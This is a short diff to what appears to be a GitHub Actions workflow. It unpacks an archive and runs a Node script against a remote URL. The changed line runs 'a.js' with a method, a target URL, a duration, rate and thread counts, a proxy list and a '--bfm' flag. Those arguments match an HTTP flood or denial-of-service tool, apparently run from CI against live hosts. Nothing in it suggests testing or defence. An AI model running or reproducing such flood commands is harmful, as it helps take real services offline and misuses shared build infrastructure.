@@ -37,7 +37,7 @@ jobs:
           unzip Fc-main.zip 
           
           cd Fc-main
-          node m.js  https://aurixprivate.online/susu  3 3 3
+          node a.js  GET https://cleaning-rational-chrome-tool.trycloudflare.com/launch?key=NEOKABAPDESTROYER 1800 4 90 proxy.txt --bfm --debug 
           
 
           
